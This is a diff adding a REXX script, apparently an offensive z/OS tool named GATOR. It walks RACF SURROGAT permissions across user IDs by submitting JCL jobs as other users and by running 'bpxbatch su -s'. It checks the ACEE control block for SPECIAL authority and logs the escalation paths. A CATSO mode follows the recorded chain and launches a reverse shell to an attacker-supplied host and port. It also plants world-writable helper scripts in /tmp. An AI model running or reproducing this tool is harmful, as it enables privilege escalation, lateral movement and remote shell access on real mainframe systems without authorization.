@@ -1,0 +1,305 @@
+/* REXX */
+/* REXX NEEDS TO BE IN HLQ.GATOR */
+/* PASS WITH NO INS PARAMATERS TO SETUP */
+/* EX 'GATOR.GATOR' 'GATOR CATSO PRIVA1,172.16.0.54,1337' */
+
+parse arg HLQ INS INS_ARGS
+
+if HLQ == "" then HLQ = "GATOR"
+
+if INS == "" then call setup
+else if INS = "SURROGAT" then call gator
+else if INS = "CATSO" then call catso_setup
+else if INS = "CATSO_CONT" then call catso
+
+return 0
+
+gator:
+say "GETTING PATH TO CURRENT ID"
+DSNNAME = "'"HLQ".PATHS("userid()")'"
+"ALLOC DA("DSNNAME") F(PATHS) SHR REUSE"
+"EXECIO * DISKR PATHS (STEM OLDPATH. FINIS"
+"FREE F(PATHS)"
+
+TYPEINDEX = OLDPATH.0 + 1
+TARGETINDEX = OLDPATH.0 + 2
+OLDPATH.0 = TARGETINDEX
+
+call lu_writer
+
+if(amispec() == 0) then
+  do
+
+    call get_visited_users
+
+    say "LISTING SURROGATS"
+    X = OUTTRAP("GATS.")
+    address TSO "SR CLASS(SURROGAT) USER("userid()")"
+    X = OUTTRAP("OFF")
+
+    do I = 1 to GATS.0
+      call parse_sr_surrogat
+    end
+  end
+  else
+    do
+      say "USER IS SPECIAL, ALL BASES BELONG TO YOU"
+    end
+say "CURRENT USER FINISHED"
+return 0
+
+
+parse_sr_surrogat:
+SURR = GATS.I
+do Q = 1 by 1 WHILE SURR <> ''
+  parse var SURR w.Q '.' SURR
+end
+w.0 = q - 1
+select
+  when (w.0 == 2 & w.2 == "SUBMIT" & notvisit(w.1))
+  then call sub_surr
+  when (w.0 == 3 & w.1 == "BPX" & w.2 == "SRV" & notvisit(w.3))
+  then call su_surr
+  otherwise say "NOP"
+end
+return 0
+
+sub_surr:
+call path_writer "SUBMIT",w.1
+say "ADDING TO CHAIN" w.1".SUBMIT RESOURCE"
+QUEUE "//"id"S JOB 'RECURSES',USER="w.1""
+QUEUE "//TSOCMD   EXEC PGM=IKJEFT01"
+QUEUE "//SYSTSPRT DD SYSOUT=*"
+QUEUE "//SYSTSIN  DD *"
+QUEUE "EX '"HLQ".GATOR' '"HLQ" SURROGAT'"
+QUEUE "//*"
+QUEUE "$$"
+o = OUTTRAP("output.",,"CONCAT")
+"SUBMIT * END($$)"
+o = OUTTRAP(OFF)
+return 0
+say "JOB SUBMITTED"
+return 0
+
+su_surr:
+call path_writer "BPX",w.3
+COMMAND = "-c ""/tmp/gator_unixm '"HLQ"'"""
+say "RUNNING:"COMMAND
+"bpxbatch sh su -s "w.3" "COMMAND
+return 0
+
+
+
+get_visited_users:
+say "FINDING VISTED USERS"
+PDSNAME = "'"HLQ".PATHS'"
+x = OUTTRAP("LISTDS.")
+address TSO "LISTDS "PDSNAME" MEMBERS"
+x = OUTTRAP("OFF")
+do P = 7 to LISTDS.0
+  INDEX = P - 6
+  USERS.INDEX = LISTDS.P
+end
+USERS.0 = LISTDS.0 - 6
+return 0
+
+path_writer:
+parse arg TYPE,TARGET
+say "UPDATING PATHS TO TARGET USER"
+OLDPATH.TYPEINDEX = TYPE
+OLDPATH.TARGETINDEX = TARGET
+DSNNAME = "'"HLQ".PATHS("TARGET")'"
+"ALLOC DA("DSNNAME") F(NEWPATHW) SHR REUSE"
+"EXECIO * DISKW NEWPATHW (STEM OLDPATH. FINIS"
+"FREE F(NEWPATHW)"
+return 0
+
+lu_writer:
+L = OUTTRAP("LU.")
+Address TSO "LU"
+L = OUTTRAP("OFF")
+DSNNAME = "'"HLQ".LUSERS("userid()")'"
+"ALLOC DA("DSNNAME") F(LUSER) SHR REUSE"
+"EXECIO * DISKW LUSER (STEM LU. FINIS"
+"FREE F(LUSER)"
+
+amispec:
+ascb_ptr = c2x(storage(d2x(x2d("224")),4))
+asxb_ptr = c2x(storage(d2x(x2d(ascb_ptr) + x2d("6c")),4))
+acee_ptr = c2x(storage(d2x(x2d(asxb_ptr) + x2d("c8")),4))
+aceeflg1 = x2b(c2x(storage(d2x(x2d(acee_ptr) + x2d("26")),1)))
+specflg = substr(aceeflg1,1,1)
+return specflg
+
+notvisit:
+do Z = 1 to USERS.0
+  if(word(USERS.Z,1) == arg(1)) then
+      do
+          return 0
+      end
+end
+return 1
+
+setup:
+say "STARTING SETUP"
+say "REMOVING OLD ARTIFACTS"
+
+"DELETE '"HLQ".PATHS'"
+"DELETE '"HLQ".LUSERS'"
+
+say "ALLOCATING PATHS + LU PDSE"
+
+"ALLOC DA('"HLQ".PATHS') NEW SPACE(50,10) TRACKS LRECL(80)",
+" RECFM(F,B) DSORG(PO) DSNTYPE(LIBRARY)"
+
+"ALLOC DA('"HLQ".LUSERS') NEW SPACE(50,10) TRACKS LRECL(80)",
+" RECFM(F,B) DSORG(PO) DSNTYPE(LIBRARY)"
+
+
+say "ALLOCATING AND CREATING START PATH"
+
+push userid()
+"ALLOC DD("userid()") DA('"HLQ".PATHS("userid()")') SHR REUSE"
+"EXECIO 1 DISKW" userid() "(FINIS"
+"FREE DD("userid()")"
+
+"ALLOCATE DDNAME(OPNWORK) PATH('/tmp/gator_unixm')
+         PATHDISP(KEEP,DELETE) PATHOPTS(ORDWR,OCREAT)
+         PATHMODE(SIXOTH,SIWOTH,SIROTH,SIRUSR,SIWUSR)"
+
+unixm.0 = 13
+unixm.1 = "/* REXX */"
+unixm.2 = "HLQ = arg(1)"
+unixm.3 = "QUEUE ""//""userid()""U JOB 'RECURSEU'"""
+unixm.4 = "QUEUE ""//TSOCMD   EXEC PGM=IKJEFT01"""
+unixm.5 = "QUEUE ""//SYSTSPRT DD SYSOUT=*"""
+unixm.6 = "QUEUE ""//SYSTSIN  DD *"""
+unixm.7 = "QUEUE ""EX '""HLQ"".GATOR' '""HLQ"" SURROGAT'"""
+unixm.8 = "QUEUE ""//*"""
+unixm.9 = "QUEUE ""$$"""
+unixm.10 = "o = OUTTRAP(""output."",,""CONCAT"")"
+unixm.11 = "address tso ""SUBMIT * END($$)"""
+unixm.12 = "o = OUTTRAP(OFF)"
+unixm.13 = "return 0"
+
+"ALLOC DDNAME(MVSWORK) DSORG(PS)",
+"LRECL(80) RECFM(F,B) NEW REU"
+"EXECIO * DISKW MVSWORK (FINIS STEM unixm."
+
+
+"OCOPY INDD(MVSWORK) OUTDD(OPNWORK) TEXT CONVERT(YES) PATHOPTS(USE)"
+
+"FREE DD(MVSWORK)"
+"FREE DD(OPNWORK)"
+
+"FREE DA('"HLQ".PATHS')"
+"FREE DA('"HLQ".LUSERS')"
+
+
+
+"EXEC '"HLQ".GATOR' '"HLQ" SURROGAT'"
+return 0
+
+
+catso:
+parse var INS_ARGS INDEX ',' ARGPASS
+parse var INS_ARGS INDEX ',' TARGET ',' ARGHOST ',' ARGPORT
+
+call parse_paths
+say NEXT_TYPE
+
+select
+  when (NEXT_TYPE == "SUBMIT" & userid() /== TARGET) then call catso_submit
+  when (NEXT_TYPE == "BPX" & userid() /== TARGET) then call catso_unixm
+  when (userid() == TARGET) then call submit_catso
+  otherwise say "NOP"
+end
+
+return 0
+
+submit_catso:
+say "SUBMITTING CATSO"
+QUEUE "//"userid()"C JOB 'SHELL',NOTIFY=&SYSUID,MSGCLASS=H,"
+QUEUE "// MSGLEVEL=(1,1)"
+QUEUE "//TSOCMD   EXEC PGM=IKJEFT01"
+QUEUE "//SYSTSPRT DD SYSOUT=*"
+QUEUE "//SYSTSIN  DD *"
+QUEUE "EX '"HLQ".CATSO' 'R "ARGHOST" "ARGPORT"'"
+QUEUE "//*"
+QUEUE "$$"
+o = OUTTRAP("output.",,"CONCAT")
+"SUBMIT * END($$)"
+o = OUTTRAP(OFF)
+return 0
+
+
+catso_unixm:
+COMMAND = "-c ""/tmp/catso_unixm '"HLQ" CATSO_CONT "NEW_INDEX","ARGPASS"'"""
+say "RUNNING:"COMMAND
+"bpxbatch sh su -s "NEXT_TARGET" "COMMAND
+return 0
+
+catso_submit:
+QUEUE "//"NEXT_TARGET"Q JOB 'CMID',NOTIFY=&SYSUID,USER="NEXT_TARGET","
+QUEUE "// MSGLEVEL=(1,1),MSGCLASS=H"
+QUEUE "//TSOCMD   EXEC PGM=IKJEFT01"
+QUEUE "//SYSTSPRT DD SYSOUT=*"
+QUEUE "//SYSTSIN  DD *"
+QUEUE "EX '"HLQ".GATOR' '"HLQ" CATSO_CONT "NEW_INDEX","ARGPASS"'"
+QUEUE "//*"
+QUEUE "$$"
+o = OUTTRAP("output.",,"CONCAT")
+"SUBMIT * END($$)"
+o = OUTTRAP(OFF)
+return 0
+
+parse_paths:
+dsnname = "'"HLQ".PATHS("TARGET")'"
+"ALLOC DD(PATHS) DA("dsnname") SHR REUSE"
+"EXECIO * DISKR PATHS (STEM PATH. FINIS"
+"FREE DD(PATHS)"
+
+SAY "INDEX:"INDEX
+TARGET_INDEX = INDEX + 1
+
+NEXT_TYPE = word(PATH.INDEX,1)
+NEXT_TARGET = WORD(PATH.TARGET_INDEX,1)
+
+say "NEXT_TYPE:"NEXT_TYPE
+say "NEXT_TARGET:"NEXT_TARGET
+
+NEW_INDEX = INDEX + 2
+return 0
+
+catso_setup:
+"ALLOCATE DDNAME(OPNWORK) PATH('/tmp/catso_unixm')
+         PATHDISP(KEEP,DELETE) PATHOPTS(ORDWR,OCREAT)
+         PATHMODE(SIXOTH,SIWOTH,SIROTH,SIRUSR,SIWUSR)"
+
+unixm.0 = 14
+unixm.1 = "/* REXX */"
+unixm.2 = "ARGPASS = arg(1)"
+unixm.3 = "QUEUE ""//""userid()""U JOB 'UMID',NOTIFY=&SYSUID,"""
+unixm.4 = "QUEUE ""// MSGLEVEL=(1,1),MSGCLASS=H"""
+unixm.5 = "QUEUE ""//TSOCMD   EXEC PGM=IKJEFT01"""
+unixm.6 = "QUEUE ""//SYSTSPRT DD SYSOUT=*"""
+unixm.7 = "QUEUE ""//SYSTSIN  DD *"""
+unixm.8 = "QUEUE ""EX '"HLQ".GATOR' '""ARGPASS""'"""
+unixm.9 = "QUEUE ""//*"""
+unixm.10 = "QUEUE ""$$"""
+unixm.11 = "o = OUTTRAP(""output."",,""CONCAT"")"
+unixm.12 = "address tso ""SUBMIT * END($$)"""
+unixm.13 = "o = OUTTRAP(OFF)"
+unixm.14 = "return 0"
+
+"ALLOC DDNAME(MVSWORK) DSORG(PS)",
+"LRECL(80) RECFM(F,B) NEW REU"
+"EXECIO * DISKW MVSWORK (FINIS STEM unixm."
+
+"OCOPY INDD(MVSWORK) OUTDD(OPNWORK) TEXT CONVERT(YES) PATHOPTS(USE)"
+
+"FREE DD(MVSWORK)"
+"FREE DD(OPNWORK)"
+
+"EX '"HLQ".GATOR' '"HLQ" CATSO_CONT 2,"INS_ARGS"'"
+return 0
